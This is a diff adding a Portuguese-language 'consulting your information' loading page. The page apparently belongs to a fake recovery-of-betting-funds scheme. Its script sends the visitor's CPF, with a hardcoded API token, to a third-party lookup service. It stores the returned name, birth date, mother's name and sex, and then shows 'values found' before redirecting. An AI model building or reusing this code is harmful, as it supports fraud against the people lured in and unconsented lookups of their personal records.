@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta name="color-scheme" content="light">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Consultando Informações...</title>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@500;700&display=swap" rel="stylesheet">
+  <style>
+    body {
+      background-color: #ffffff;
+      margin: 0;
+      padding: 20px 12px;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      font-family: 'Plus Jakarta Sans', sans-serif;
+      color: #1155cc;
+      box-sizing: border-box;
+    }
+
+    .card {
+      background: transparent;
+      border: none;
+      box-shadow: none;
+      max-width: 480px;
+      width: 100%;
+      min-height: calc(100vh - 40px);
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 30px 24px;
+      box-sizing: border-box;
+    }
+
+    .spinner {
+      width: 45px;
+      height: 45px;
+      border: 4px solid rgba(17, 85, 204, 0.2);
+      border-top: 4px solid #1155cc;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .loading-text {
+      color: #1155cc !important;
+      opacity: 1;
+      font-size: 17px;
+      font-weight: 700;
+      text-align: center;
+      padding: 0 20px;
+      transition: opacity 0.3s ease;
+    }
+  
+    /* Previne zoom em inputs no iOS */
+    input, select, textarea {
+      font-size: 16px !important;
+      touch-action: manipulation;
+    }
+    </style>
+
+    <style>
+      /* Proteção global para todas as imagens */
+      img {
+        pointer-events: none !important;
+        -webkit-touch-callout: none !important;
+        -webkit-user-select: none !important;
+        user-select: none !important;
+      }
+    </style>
+    </head>
+<body>
+
+  <div class="card">
+    <div class="spinner"></div>
+    <div class="loading-text" id="loadingText">Consultando suas informações...</div>
+  </div>
+
+  <script>
+    const cpf = localStorage.getItem('recupera_cpf');
+    const texts = [
+      "Consultando suas informações...",
+      "Consultando contas onde você tem bet...",
+      "Consultando valores a receber...",
+      "Valores encontrados!"
+    ];
+
+    let currentIndex = 0;
+    let animacaoPronta = false;
+    let nomePronto = false;
+    const textElement = document.getElementById('loadingText');
+
+    // Função que redireciona somente quando AMBOS estiverem prontos
+    function tentarRedirecionar() {
+      if (animacaoPronta && nomePronto) {
+        window.location.href = 'pesquisa.html';
+      }
+    }
+
+    // Animação dos textos (roda em paralelo com a API)
+    const interval = setInterval(() => {
+      currentIndex++;
+      if (currentIndex < texts.length) {
+        textElement.style.opacity = '0';
+        setTimeout(() => {
+          textElement.textContent = texts[currentIndex];
+          textElement.style.opacity = '1';
+        }, 300);
+      } else {
+        clearInterval(interval);
+        animacaoPronta = true;
+        tentarRedirecionar();
+      }
+    }, 2000);
+
+    // ⚡ PRELOAD: começa a baixar a imagem do certificado em background
+    // Aguarda 500ms para garantir que a página de loading já apareceu na tela
+    setTimeout(() => {
+      const _preloadDoc = new Image();
+      _preloadDoc.src = 'documentologo/documento2.webp?v=7';
+    }, 500);
+
+    // Busca o nome na API em paralelo
+    async function buscarNome() {
+      if (!cpf) {
+        nomePronto = true;
+        tentarRedirecionar();
+        return;
+      }
+
+      // Se já foi consultado na página anterior (cpf.html), usa imediatamente
+      const nomeSalvo = localStorage.getItem('recupera_nome');
+      if (nomeSalvo) {
+        nomePronto = true;
+        tentarRedirecionar();
+        return;
+      }
+
+      const ZAPGROUP_TOKEN = 'c93601cbe0fce3f5c5b1e3b40c840f500fb162f91103beb42e839b7839813f93';
+      let nome = null;
+
+      // 1. Tenta API ZapGroup direto no browser
+      try {
+        const rZap = await Promise.race([
+          fetch(`https://api.zapgroup.shop/consultar-filtrada/cpf?cpf=${cpf}&token=${ZAPGROUP_TOKEN}`),
+          new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 6000))
+        ]);
+        if (rZap.ok) {
+          const dZap = await rZap.json();
+          if (dZap && dZap.nome) {
+            nome = dZap.nome.trim().toUpperCase();
+            if (dZap.nascimento) localStorage.setItem('recupera_nascimento', dZap.nascimento);
+            if (dZap.mae) localStorage.setItem('recupera_mae', dZap.mae);
+            if (dZap.sexo) localStorage.setItem('recupera_sexo', dZap.sexo);
+          }
+        }
+      } catch(e) { /* Fallback */ }
+
+      // 2. Tenta Node proxy (/api/consulta-cpf)
+      if (!nome) {
+        try {
+          const r = await Promise.race([
+            fetch(`/api/consulta-cpf?cpf=${cpf}`),
+            new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 4000))
+          ]);
+          if (r.ok) {
+            const d = await r.json();
+            if (d && d.success && d.nome) {
+              nome = d.nome.trim().toUpperCase();
+              if (d.nascimento) localStorage.setItem('recupera_nascimento', d.nascimento);
+              if (d.mae) localStorage.setItem('recupera_mae', d.mae);
+              if (d.sexo) localStorage.setItem('recupera_sexo', d.sexo);
+            }
+          }
+        } catch(e) { /* Node offline */ }
+      }
+
+      // Salva no localStorage (resultado.html vai ler daqui)
+      if (nome) {
+        localStorage.setItem('recupera_nome', nome);
+      }
+
+      nomePronto = true;
+      tentarRedirecionar();
+    }
+
+    buscarNome();
+  </script>
+
+  <script>
+    // ─── REPASSADOR DE UTMs (ttclid, utm_source, etc.) ──────────────
+    (function() {
+      var urlParams = window.location.search;
+      if (!urlParams) return;
+      function appendParamsToLinks() {
+        var links = document.getElementsByTagName('a');
+        for (var i = 0; i < links.length; i++) {
+          var href = links[i].getAttribute('href');
+          if (!href || href.startsWith('#') || href.startsWith('javascript:') || href.startsWith('mailto:')) continue;
+          var sep = href.indexOf('?') !== -1 ? '&' : '?';
+          var params = urlParams.startsWith('?') ? urlParams.slice(1) : urlParams;
+          links[i].setAttribute('href', href + sep + params);
+        }
+      }
+      if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', appendParamsToLinks);
+      } else {
+        appendParamsToLinks();
+      }
+    })();
+    // ────────────────────────────────────────────────────────────────
+  </script>
+</body>
+</html>
